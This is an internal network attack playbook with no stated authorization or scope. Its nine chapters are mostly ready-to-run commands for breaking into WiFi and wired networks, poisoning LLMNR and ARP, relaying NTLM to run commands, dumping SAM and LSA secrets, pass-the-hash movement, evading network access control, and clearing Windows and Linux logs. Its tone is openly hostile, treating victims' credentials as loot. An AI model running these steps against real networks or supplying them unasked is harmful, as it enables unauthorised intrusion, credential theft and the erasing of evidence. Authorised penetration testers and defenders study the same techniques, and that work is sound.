
---

# Internal Network Reconnaissance & Attack Playbook

## Chapter 1: Gaining Position

Before you scan a damn thing, you need to be *on* the network.

### 1.1 WiFi — The Softest Entry

**Recon first:**

```bash
# Put wireless interface in monitor mode
sudo airmon-ng start wlan0

# Scan for all networks
sudo airodump-ng wlan0mon

# Target a specific network
sudo airodump-ng --bssid <TARGET_MAC> --channel <CH> -w capture wlan0mon

# Check for clients connected (for deauth)
# Look for WPS-enabled networks (easy mode)
sudo wash -i wlan0mon
```

**Attack vectors:**

- **Open/Guest WiFi** — Connect directly. No auth needed. Most dangerous for the target, easiest for you.
- **WPA2/WPA3** — Capture handshake, crack offline:
  ```bash
  # Deauth to force handshake
  sudo aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
  
  # Crack with Hashcat (GPU)
  hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
  
  # Or use aircrack
  aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
  ```
- **WPS PIN** — Reaver or Bully:
  ```bash
  sudo reaver -i wlan0mon -b <AP_MAC> -vv
  ```
- **Evil Twin** — Host a fake access point with the same SSID:
  ```bash
  # Using Wifiphisher
  sudo wifiphisher --essid "Starbucks_Guest" -p oauth-login
  
  # Or manual with hostapd + dnsmasq + fake captive portal
  # Victims connect, enter creds, you capture
  ```

### 1.2 Ethernet — The Conference Room Jack

Walk into the building. Find:
- Conference rooms with exposed wall jacks
- Printers with ethernet (unmonitored switch ports)
- VoIP phones (many have a pass-through port)
- Loading docks with unsecured network drops

Plug in. DHCP usually gives you an IP instantly. If not:
```bash
# Static IP guessing
# Try the network range based on what you see
sudo ip addr add 192.168.1.100/24 dev eth0
sudo ip route add default via 192.168.1.1

# Or use DHCP
sudo dhclient eth0
```

**Port security bypass:**
- If the port is MAC-locked, clone a legitimate device's MAC:
  ```bash
  # Find a printer or phone MAC from the wall jack label, or sniff it
  sudo macchanger -m <LEGIT_MAC> eth0
  sudo dhclient eth0
  ```

---

## Chapter 2: Network Reconnaissance — Once You're In

You have an IP. Now map the terrain.

### 2.1 Identify Your Position

```bash
# Your IP and network info
ip addr
ip route
cat /etc/resolv.conf

# Default gateway
ip route | grep default

# DHCP info
cat /var/lib/dhcp/dhclient.leases

# Check if you're behind a captive portal
curl -I http://neverssl.com
```

### 2.2 Host Discovery (Internal Sweep)

```bash
# ARP scan (fastest on local segment)
sudo arp-scan -l
sudo arp-scan --localnet

# Nmap ping sweep (ICMP + ARP)
sudo nmap -sn 192.168.1.0/24 -oG hosts_up.txt

# Netdiscover (passive + active)
sudo netdiscover -r 192.168.1.0/24

# Masscan for large internal ranges
sudo masscan 10.0.0.0/8 -p0 --rate 10000
```

### 2.3 Service Enumeration

```bash
# Top ports on discovered hosts
sudo nmap -sS -sV -O -A -iL hosts_up.txt -oA internal_enum

# Full port scan on interesting targets
sudo nmap -p- -sS -sV <TARGET_IP> -oA target_full

# Fast UDP scan
sudo nmap -sU --top-ports 100 <TARGET_IP>

# NSE scripts for common services
sudo nmap -sV --script=vuln,smb-enum-shares,smb-enum-users,ftp-anon,snmp-info <TARGET_IP>
```

### 2.4 Passive Network Recon (No Scanning)

Sometimes you don't want to send a single packet.

```bash
# tcpdump — listen to all traffic
sudo tcpdump -i eth0 -w capture.pcap

# Wireshark analysis:
# - Look for: NBNS broadcasts, LLMNR queries, mDNS, ARP
# - These reveal hostnames, services, Windows domains

# Bettercap (modern MITM framework)
sudo bettercap -iface eth0

# In bettercap:
net.probe on          # Probe for hosts
net.show              # Show discovered hosts
set arp.spoof.targets <TARGET_IP>
arp.spoof on          # Start ARP poisoning
set net.sniff.verbose true
net.sniff on          # Capture traffic
```

---

## Chapter 3: Protocol Attacks on Local Networks

Local networks are trust-based. Trust is exploitable.

### 3.1 LLMNR / NBT-NS / mDNS Poisoning

Windows machines broadcast name resolution requests when DNS fails. You answer them.

```bash
# Using Responder
sudo responder -I eth0 -wrfv

# This poisons:
# - LLMNR (Link-Local Multicast Name Resolution)
# - NBT-NS (NetBIOS Name Service)
# - mDNS (multicast DNS)

# When a victim tries to resolve a non-existent hostname,
# Responder answers with YOUR IP
# Victim sends NTLM hash during SMB/HTTP auth attempt

# Capture hashes:
cat /usr/share/responder/logs/*

# Crack with Hashcat
hashcat -m 5600 SMBv2-NTLMv2-SSP.hash /usr/share/wordlists/rockyou.txt
```

**Real-world scenario:** Someone types `\\fileserver` (misspelled). DNS fails. LLMNR broadcast. You respond. They authenticate to you. Hash captured.

### 3.2 ARP Spoofing / Man-in-the-Middle

```bash
# Using arpspoof (dsniff)
sudo arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>
sudo arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>

# Using Bettercap (more modern)
sudo bettercap -iface eth0
set arp.spoof.targets <VICTIM_IP>
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on

# Now all victim traffic flows through you
# Capture credentials:
# - HTTP logins (unencrypted)
# - FTP
# - Telnet
# - POP3/IMAP
# - Cookies (session hijacking)

# Use sslstrip to downgrade HTTPS (limited effectiveness now due to HSTS)
# Better: Use mitmproxy or Burp to intercept
```

### 3.3 DHCP Exhaustion / Rogue DHCP

```bash
# DHCP starvation (exhaust pool)
sudo yersinia dhcp -attack 1 -interface eth0

# Rogue DHCP server
# Configure dnsmasq to hand out your IP as gateway
# All traffic routes through you
sudo dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,12h --dhcp-option=3,<YOUR_IP> --dhcp-option=6,<YOUR_IP>

# Or use Ettercap's DHCP spoofing
```

### 3.4 VLAN Hopping

If the network uses VLANs, you might be able to escape your segment.

```bash
# Check if switchport is trunk or access
# Try double-tagging (if switch is misconfigured):
# Scapy script or Yersinia

sudo yersinia dhcp -attack 1 -interface eth0

# Or use frogger (automated VLAN hopping)
git clone https://github.com/nccgroup/vlan-hopping.git
cd vlan-hopping
sudo ./frogger.sh
```

---

## Chapter 4: Service Exploitation on Internal Networks

Internal services are often less hardened than external-facing ones.

### 4.1 SMB / Windows File Sharing

```bash
# Null session enumeration
enum4linux -a <TARGET_IP>
rpcclient -U "" -N <TARGET_IP>

# List shares
smbclient -L //<TARGET_IP> -N
smbmap -H <TARGET_IP>
crackmapexec smb <TARGET_IP> -u '' -p '' --shares

# Check for writable shares
crackmapexec smb <TARGET_IP> -u 'guest' -p '' --shares

# If you have creds:
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --lsa    # Dump LSA secrets
crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --sam    # Dump SAM
```

### 4.2 SNMP Enumeration

```bash
# Default/community strings: public, private, manager
snmpwalk -c public -v1 <TARGET_IP>
snmp-check <TARGET_IP>

# Onesixtyone for brute-forcing community strings
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>
```

### 4.3 Database Discovery

```bash
# Scan for common DB ports
sudo nmap -p 1433,1521,3306,5432,27017,6379,9200 <TARGET_IP>

# If MySQL is open with no auth:
mysql -h <TARGET_IP> -u root

# If MSSQL:
# Use impacket-mssqlclient
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth
```

### 4.4 Printer Exploitation

Printers are the forgotten attack surface.

```bash
# PJL/PML access
# Many printers have web interfaces with no auth
curl http://<PRINTER_IP>/
curl http://<PRINTER_IP>/devMgmt/productConfig.xml

# Printer exploitation toolkit (PRET)
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
./pret.py <PRINTER_IP> pjl
# > ls
# > get /etc/passwd
# > print "You have been hacked"

# Printers often have stored documents, address books, credentials
```

---

## Chapter 5: Wireless Attacks Beyond Just Connecting

### 5.1 WiFi Pineapple / Rogue Access Points

```bash
# Host a rogue AP with Kali + hostapd
# Capture all traffic from connected clients

# Or use WiFi Pineapple (hardware tool)
# Deauth clients from legitimate AP, they auto-connect to your rogue AP (same SSID, stronger signal)

# Karma attack (respond to ALL probe requests)
# Pineapple does this automatically
# Any device probing for "HomeWiFi" — your Pineapple says "I'm HomeWiFi"
```

### 5.2 WPA Enterprise Attacks

If the target uses WPA-Enterprise (802.1X):

```bash
# Host a rogue RADIUS server
# Use hostapd-mana or freeradius-wpe
# Capture MSCHAPv2 challenge-response

sudo hostapd-mana/hostapd/hostapd-mana.conf

# Crack with asleap or hashcat
asleap -C <CHALLENGE> -R <RESPONSE> -W /usr/share/wordlists/rockyou.txt
```

### 5.3 Bluetooth Recon & Attacks

```bash
# Scan for devices
hcitool scan
hcitool inq

# Deep inspection
sdptool browse <MAC>

# BlueBorne vulnerability check
# Use tools from https://github.com/ArmisSecurity/blueborne

# Bluetooth HID attack (inject keystrokes)
# Requires specialized hardware or software like BtleJack
```

---

## Chapter 6: Physical Network Interception

### 6.1 Network Taps

If you have physical access to cabling:
- **Throwing Star LAN Tap** — Passive ethernet tap. Splits TX/RX to monitoring ports. Undetectable.
- **Raspberry Pi Zero with two USB ethernet adapters** — Inline bridge. Transparent to network.

```bash
# Configure Pi as transparent bridge
sudo brctl addbr br0
sudo brctl addif br0 eth0 eth1
sudo ifconfig br0 up

# Run tcpdump on br0
sudo tcpdump -i br0 -w intercepted.pcap
```

### 6.2 VoIP Interception

```bash
# If you have access to the voice VLAN:
sudo vlan-hopping/frogger.sh

# Capture RTP streams
sudo tcpdump -i eth0 -w voip.pcap udp portrange 10000-20000

# Extract audio with Wireshark:
# Telephony > VoIP Calls > Decode > Play
```

---

## Chapter 7: Lateral Movement from Internal Position

Once you compromise one internal host, move.

### 7.1 Pass-the-Hash / Pass-the-Ticket

```bash
# If you have NTLM hash (no plaintext password needed):
pth-winexe -U <USER>%<NTLM_HASH> //<TARGET_IP> cmd.exe

# Using Impacket:
impacket-psexec -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>@<TARGET_IP>
impacket-wmiexec -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER>@<TARGET_IP>

# Pass-the-Ticket (Kerberos):
# Export ticket with Mimikatz/Rubeus
# Use with Impacket:
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_IP>
```

### 7.2 LLMNR/NBT-NS Relay (ntlmrelayx)

Instead of just capturing hashes, relay them to another machine:

```bash
# Responder + ntlmrelayx combo
# Edit Responder.conf: turn SMB and HTTP OFF (we're relaying, not capturing)

sudo responder -I eth0 -wrfv

# In another terminal:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# targets.txt contains IPs of machines where SMB signing is NOT required
# You relay captured auth to those machines and execute commands
```

### 7.3 BloodHound — Map the Internal Domain

```bash
# Run SharpHound (ingestor) on compromised Windows host
# Or use Python BloodHound.py from Linux:
bloodhound-python -u <USER> -p <PASS> -ns <DC_IP> -d <DOMAIN> -c all

# Upload ZIP to BloodHound GUI
# Query:
# - Shortest path to Domain Admin
# - Kerberoastable users
# - Users with DCSync rights
# - Unconstrained delegation
```

---

## Chapter 8: Evasion on Internal Networks

### 8.1 Blend In

```bash
# Use legitimate hostnames
hostnamectl set-hostname DESKTOP-ABC123  # Match target naming convention

# Use their DNS
# Use their NTP
# Match their User-Agent if doing HTTP

# Slow down scans
nmap -T2 --max-retries 1 --scan-delay 5s <TARGET>
```

### 8.2 Avoid NAC (Network Access Control)

```bash
# If port security/MAC filtering:
# Sniff a legitimate MAC, clone it
sudo macchanger -m <LEGIT_MAC> eth0

# If 802.1X:
# Wait for legitimate device to authenticate, then physically inline behind it
# Or use a tool like "frogger" to bypass
```

### 8.3 Clear Local Traces

```bash
# On compromised Linux hosts:
history -c
rm -f ~/.bash_history
export HISTFILE=/dev/null

# On compromised Windows hosts:
wevtutil cl Security
wevtutil cl System
Clear-History
```

---

## Chapter 9: The Internal Recon Checklist

Before moving to domain dominance:

**Network Mapping:**
- [ ] Your IP, gateway, DNS, DHCP server identified
- [ ] All live hosts on subnet discovered
- [ ] All open ports and services enumerated
- [ ] OS fingerprinting completed
- [ ] VLANs identified (if any)

**Protocol Intelligence:**
- [ ] LLMNR/NBT-NS/mDNS responses captured
- [ ] ARP table mapped
- [ ] DHCP server identified (legitimate vs rogue)
- [ ] DNS server identified and tested for recursion

**Windows Domain (if present):**
- [ ] Domain Controller IP identified
- [ ] Domain name discovered
- [ ] LDAP/SMB accessible?
- [ ] Any null-session shares?
- [ ] BloodHound data collected

**Wireless:**
- [ ] All SSIDs in area catalogued
- [ ] Security type noted (Open/WPA2/WPA3/Enterprise)
- [ ] Clients and their probe requests noted
- [ ] Rogue AP feasibility assessed

**Physical:**
- [ ] Network jack locations mapped
- [ ] Printer IPs and models noted
- [ ] VoIP phones identified
- [ ] Any exposed infrastructure (switches, routers, server room access)

---
